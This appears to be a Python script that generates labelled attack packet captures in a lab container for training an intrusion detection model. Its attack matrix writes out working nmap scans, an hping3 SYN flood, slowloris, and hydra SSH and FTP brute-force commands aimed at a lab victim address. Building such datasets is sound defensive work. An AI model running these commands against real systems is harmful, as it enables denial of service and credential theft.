"""Synthetic attack PCAP generator.

Runs INSIDE the lab-attacker container. For each attack in the matrix:
  1. Apply a netem profile to the attacker's egress (clean / high-latency / lossy)
  2. Start tcpdump with a BPF filter scoped to the victim
  3. Run the attack tool with a timeout
  4. Stop tcpdump cleanly (SIGINT, then 1s drain)
  5. Validate the PCAP with scapy and write a sidecar JSON with metadata

CLI:
  python /work/generate.py one ATTACK_NAME [--netem clean|high-latency|lossy]
  python /work/generate.py all [--netem-profiles clean,high-latency,lossy]
  python /work/generate.py list
"""
from __future__ import annotations

import argparse
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

VICTIM_IP = os.environ.get("VICTIM_IP", "172.28.0.10")
PCAP_DIR = Path(os.environ.get("PCAP_DIR", "/work/pcaps"))
WORDLIST = Path("/work/attacks/passwords.txt")
PCAP_DIR.mkdir(parents=True, exist_ok=True)


# Each entry: cmd is a list (or list of lists for multi-step), label is the
# CIC-IDS2017 class this PCAP should be labeled as for training.
ATTACK_MATRIX: dict[str, dict] = {
    # ---- PortScan variants ----
    "portscan_syn": {
        "label": "PortScan",
        "cmd": ["nmap", "-sS", "--top-ports", "1000", "-T4", VICTIM_IP],
        "timeout": 60,
    },
    "portscan_fin": {
        "label": "PortScan",
        "cmd": ["nmap", "-sF", "--top-ports", "1000", "-T4", VICTIM_IP],
        "timeout": 60,
    },
    "portscan_null": {
        "label": "PortScan",
        "cmd": ["nmap", "-sN", "--top-ports", "1000", "-T4", VICTIM_IP],
        "timeout": 60,
    },
    "portscan_xmas": {
        "label": "PortScan",
        "cmd": ["nmap", "-sX", "--top-ports", "1000", "-T4", VICTIM_IP],
        "timeout": 60,
    },
    "portscan_slow": {
        "label": "PortScan",
        "cmd": ["nmap", "-sS", "--top-ports", "100", "-T1", VICTIM_IP],
        "timeout": 120,
    },
    # ---- DoS family ----
    "dos_synflood": {
        "label": "DoS Hulk",  # Hulk is the CIC class for high-rate HTTP/TCP flood
        "cmd": ["hping3", "--flood", "--syn", "-p", "80", "-c", "10000", VICTIM_IP],
        "timeout": 15,
    },
    "dos_slowloris": {
        "label": "DoS slowloris",
        "cmd": ["slowloris", VICTIM_IP, "-p", "80", "-s", "100"],
        "timeout": 25,
    },
    # ---- Brute force ----
    "bruteforce_ssh": {
        "label": "SSH-Patator",
        "cmd": ["hydra", "-l", "testuser", "-P", str(WORDLIST),
                "-t", "4", "-w", "5", "-f", "-I",
                f"ssh://{VICTIM_IP}"],
        "timeout": 60,
    },
    "bruteforce_ftp": {
        "label": "FTP-Patator",
        "cmd": ["hydra", "-l", "testuser", "-P", str(WORDLIST),
                "-t", "4", "-w", "5", "-f", "-I",
                f"ftp://{VICTIM_IP}"],
        "timeout": 60,
    },
    # ---- Benign baselines ----
    "benign_http": {
        "label": "BENIGN",
        "cmd": ["bash", "-c",
                f"for i in $(seq 1 60); do curl -s -o /dev/null http://{VICTIM_IP}/; sleep 0.4; done"],
        "timeout": 35,
    },
    "benign_ftp": {
        "label": "BENIGN",
        "cmd": ["bash", "-c",
                f"for i in $(seq 1 30); do curl -s -o /dev/null --connect-timeout 3 ftp://{VICTIM_IP}/ || true; sleep 0.8; done"],
        "timeout": 35,
    },
}


def apply_netem(profile: str) -> None:
    """Apply a network impairment profile to the egress interface."""
    if profile == "clean":
        subprocess.run(["netem", "clear"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return
    rc = subprocess.run(["netem", profile], check=False).returncode
    if rc != 0:
        print(f"[WARN] netem {profile} failed (rc={rc}); continuing without impairment", file=sys.stderr)


def capture_one(attack_name: str, netem_profile: str = "clean") -> Path | None:
    """Run one attack with capture. Returns the PCAP path on success."""
    if attack_name not in ATTACK_MATRIX:
        raise ValueError(f"Unknown attack {attack_name!r}; see ATTACK_MATRIX")
    spec = ATTACK_MATRIX[attack_name]

    apply_netem(netem_profile)

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_name = f"{attack_name}__{netem_profile}__{stamp}.pcap"
    pcap_path = PCAP_DIR / pcap_name

    # tcpdump scoped to victim host so background docker noise (DNS, ARP) is
    # filtered out at capture time.
    bpf = f"host {VICTIM_IP}"
    tcpdump = subprocess.Popen(
        ["tcpdump", "-i", "eth0", "-w", str(pcap_path), "-U", "-q", bpf],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    time.sleep(1.0)  # let tcpdump bind

    print(f"[{attack_name} / netem={netem_profile}] running: {' '.join(spec['cmd'])}")
    t0 = time.time()
    try:
        subprocess.run(
            spec["cmd"],
            timeout=spec["timeout"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except subprocess.TimeoutExpired:
        # expected for floods/slowloris/brute-force
        pass
    except FileNotFoundError as e:
        print(f"[ERROR] tool not found: {e}", file=sys.stderr)
        tcpdump.send_signal(signal.SIGINT)
        tcpdump.wait(timeout=5)
        return None
    elapsed = time.time() - t0

    # Drain in-flight packets
    time.sleep(1.0)
    tcpdump.send_signal(signal.SIGINT)
    try:
        tcpdump.wait(timeout=5)
    except subprocess.TimeoutExpired:
        tcpdump.kill()

    if netem_profile != "clean":
        apply_netem("clean")  # reset between captures

    # Validate
    size = pcap_path.stat().st_size if pcap_path.exists() else 0
    if size < 50:
        print(f"  [WARN] PCAP too small ({size} bytes); skipping metadata write")
        return None

    try:
        from scapy.all import rdpcap
        packets = rdpcap(str(pcap_path))
        n_pkts = len(packets)
    except Exception as e:
        print(f"  [WARN] scapy could not parse: {e}")
        n_pkts = -1

    # Write sidecar metadata
    meta = {
        "attack_name": attack_name,
        "label": spec["label"],
        "netem_profile": netem_profile,
        "victim_ip": VICTIM_IP,
        "command": spec["cmd"],
        "timeout_sec": spec["timeout"],
        "elapsed_sec": round(elapsed, 2),
        "pcap_bytes": size,
        "packets": n_pkts,
        "captured_at": stamp,
    }
    meta_path = pcap_path.with_suffix(".meta.json")
    meta_path.write_text(json.dumps(meta, indent=2))

    print(f"  ✓ {pcap_name}  pkts={n_pkts} bytes={size} elapsed={elapsed:.1f}s")
    return pcap_path


def run_all(profiles: list[str]) -> dict:
    """Run the full attack × netem matrix. Returns a summary dict."""
    summary = {"attempted": 0, "succeeded": 0, "failed": [], "pcaps": []}
    for attack_name in ATTACK_MATRIX:
        for profile in profiles:
            summary["attempted"] += 1
            try:
                p = capture_one(attack_name, profile)
                if p is None:
                    summary["failed"].append(f"{attack_name}/{profile}")
                else:
                    summary["succeeded"] += 1
                    summary["pcaps"].append(str(p.name))
            except Exception as e:
                print(f"[ERROR] {attack_name}/{profile}: {e}", file=sys.stderr)
                summary["failed"].append(f"{attack_name}/{profile}: {e}")
            time.sleep(2)  # gap between captures so background noise settles
    return summary


def main() -> int:
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("list", help="Print attack matrix")

    one = sub.add_parser("one", help="Run one attack")
    one.add_argument("attack")
    one.add_argument("--netem", default="clean")

    full = sub.add_parser("all", help="Run full attack × netem matrix")
    full.add_argument("--netem-profiles", default="clean,high-latency,lossy",
                      help="Comma-separated list of netem profiles")

    args = parser.parse_args()

    if args.cmd == "list":
        for name, spec in ATTACK_MATRIX.items():
            print(f"  {name:20s}  -> {spec['label']:18s}  {' '.join(spec['cmd'])[:80]}")
        return 0

    if args.cmd == "one":
        p = capture_one(args.attack, args.netem)
        return 0 if p else 1

    if args.cmd == "all":
        profiles = [x.strip() for x in args.netem_profiles.split(",") if x.strip()]
        summary = run_all(profiles)
        out = PCAP_DIR / f"_run_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps(summary, indent=2))
        print(f"\nDone: {summary['succeeded']}/{summary['attempted']} succeeded")
        if summary["failed"]:
            print(f"Failed: {summary['failed']}")
        print(f"Summary: {out}")
        return 0

    return 1


if __name__ == "__main__":
    sys.exit(main())
